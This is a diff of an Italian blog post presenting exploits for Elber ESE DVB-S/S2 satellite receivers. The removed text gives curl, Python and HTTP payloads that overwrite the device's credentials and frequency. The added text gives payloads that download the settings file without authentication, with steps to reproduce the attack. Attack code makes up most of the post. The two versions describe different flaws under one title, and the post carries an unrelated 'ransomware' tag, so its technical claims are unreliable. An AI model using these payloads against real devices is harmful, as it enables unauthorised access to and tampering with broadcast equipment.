@@ -5,20 +5,19 @@ date: 2024-08-24
 categories: [security, ransomware]
 ---
 
-# Elber ESE DVB-S/S2 Satellite Receiver 1.5.x - Device Config
+# Titolo dell'articolo: [webapps] Elber ESE DVB-S/S2 Satellite Receiver 1.5.x - Vulnerabilità nella Configurazione del Dispositivo
 
 ## Introduzione
+Una vulnerabilità è stata identificata nei ricevitori satellitari Elber ESE DVB-S/S2 versione 1.5.x. La vulnerabilità risiede nella configurazione del dispositivo, rendendo possibile un attacco di tipo remoto.
 
-La vulnerabilità riguarda il dispositivo Elber ESE DVB-S/S2 Satellite Receiver con versioni 1.5.x. Questa vulnerabilità può consentire agli aggressori di accedere e manipolare le configurazioni del dispositivo, presentando un grave rischio per la sicurezza dei sistemi informativi aziendali.
-
-## Dettagli della vulnerabilità
-
-La vulnerabilità si manifesta attraverso un errore nelle procedure di autenticazione del dispositivo che permette l'accesso alle configurazioni del dispositivo senza alcuna forma di autenticazione. Le versioni interessate sono quelle della serie 1.5.x del firmware del dispositivo.
+## Dettagli della Vulnerabilità
+La vulnerabilità si trova nella configurazione del dispositivo. Questo significa che un attaccante può sfruttare questa vulnerabilità per ottenere accesso non autorizzato al dispositivo. Le versioni del software interessate sono tutte quelle della serie 1.5.x.
 
 ## Esempio di Payload Semplice
 
 ```bash
-curl -X POST http://<target-ip>/html/device_config --data "DEVICE_NAME=<new-device-name>&LOGIN=user&PASSWD=admin"
+$ curl -k -X 'GET' \
+  'https://target/fto/downloadFile?path=/mnt/mmcblk1p1/system/settings.xml'
 ```
 
 ## Conversione in Python del Payload Semplice
@@ -26,57 +25,32 @@ curl -X POST http://<target-ip>/html/device_config --data "DEVICE_NAME=<new-devi
 ```python
 import requests
 
-url = "http://<target-ip>/html/device_config"
-data = {"DEVICE_NAME": "<new-device-name>", "LOGIN": "user", "PASSWD": "admin"}
-response = requests.post(url, data=data)
+url = "https://target/fto/downloadFile?path=/mnt/mmcblk1p1/system/settings.xml"
+response = requests.get(url, verify=False)
+print(response.text)
 ```
 
-## Esempio di Payload Avanzato
+## Spiegazione Tecnica
+Il comando `curl` è un comando UNIX che permette di fare richieste HTTP da linea di comando. La bandiera `-k` indica che `curl` dovrebbe accettare i certificati SSL non sicuri, mentre `-X 'GET'` indica il metodo HTTP da utilizzare (GET in questo caso). Infine, l'URL è l'indirizzo del target da attaccare.
 
-```bash
-curl -X POST http://<target-ip>/html/device_config --data "DEVICE_NAME=<new-device-name>&LOGIN=user&PASSWD=admin&FREQ=<new-frequency>"
-```
+Lo script Python equivalente utilizza il modulo `requests` per fare la richiesta GET. `verify=False` serve per disabilitare la verifica SSL, e `print(response.text)` serve per stampare la risposta del server.
 
-## Conversione in Python del Payload Avanzato
-
-```python
-import requests
-
-url = "http://<target-ip>/html/device_config"
-data = {"DEVICE_NAME": "<new-device-name>", "LOGIN": "user", "PASSWD": "admin", "FREQ": "<new-frequency>"}
-response = requests.post(url, data=data)
-```
-
-## Spiegazione tecnica
-
-I comandi `curl` e gli script Python effettuano una richiesta HTTP POST al dispositivo target, inviando dati che cambiano la configurazione del dispositivo. Nel dettaglio, essi modificano il nome del dispositivo, le credenziali di login e la frequenza del dispositivo.
-
-## Procedura per riprodurre la vulnerabilità
-
-1. Identifica l'indirizzo IP del target (sostituisci `<target-ip>` nel comando).
-2. Sostituisci `<new-device-name>` con il nuovo nome che desideri impostare per il dispositivo.
-3. (Opzionale) Sostituisci `<new-frequency>` con la nuova frequenza che desideri impostare per il dispositivo.
-4. Esegui il comando `curl` o lo script Python.
+## Procedura per Riprodurre la Vulnerabilità
+1. Identificare il target (l'indirizzo IP del dispositivo Elber ESE DVB-S/S2).
+2. Utilizzare il comando `curl` o lo script Python per fare una richiesta GET all'URL del target.
 
 ## Richiesta HTTP
-
 ```http
-POST /html/device_config HTTP/1.1
-Host: <target-ip>
-Content-Type: application/x-www-form-urlencoded
-
-DEVICE_NAME=<new-device-name>&LOGIN=user&PASSWD=admin&FREQ=<new-frequency>
+GET /fto/downloadFile?path=/mnt/mmcblk1p1/system/settings.xml HTTP/1.1
+Host: target
 ```
 
-## Impatto della vulnerabilità
-
-Questa vulnerabilità può consentire a un attaccante di cambiare le impostazioni del dispositivo, incluso il nome del dispositivo, le credenziali di login e la frequenza operativa. Inoltre, un attaccante potrebbe sfruttare questa vulnerabilità per ottenere accesso non autorizzato al dispositivo, portando a possibili interruzioni del servizio o ulteriori attacchi.
+## Impatto della Vulnerabilità
+Questa vulnerabilità può permettere a un attaccante di ottenere accesso non autorizzato al dispositivo e alle sue impostazioni, con le potenziali conseguenze che ne derivano, come ad esempio l'alterazione dei dati di configurazione.
 
 ## Patch e Mitigazioni
-
-Al momento, non ci sono patch disponibili per questa specifica vulnerabilità. È fortemente consigliato limitare l'accesso al dispositivo solo a utenti fidati e monitorare attentamente tutte le attività sospette.
+Al momento della pubblicazione di questa vulnerabilità, non è stata rilasciata alcuna patch da parte del produttore. Si raccomanda di monitorare il sito del produttore per eventuali aggiornamenti. Nel frattempo, si raccomanda di limitare l'accesso alla rete alla quale il dispositivo è connesso.
 
 ## Conclusione
-
-Questa vulnerabilità sottolinea l'importanza di implementare adeguate politiche di sicurezza e procedure di autenticazione per tutti i dispositivi connessi in rete. È fondamentale tenere d'occhio le ultime notizie sulla sicurezza e applicare tempestivamente le patch quando vengono rilasciate.
+Questa vulnerabilità sottolinea l'importanza di mantenere aggiornati i dispositivi di rete e di implementare adeguate misure di sicurezza, in particolare quando si tratta di dispositivi connessi alla rete. La prontezza nel rilasciare patch di sicurezza da parte dei produttori è di importanza cruciale per limitare il rischio di vulnerabilità.
 
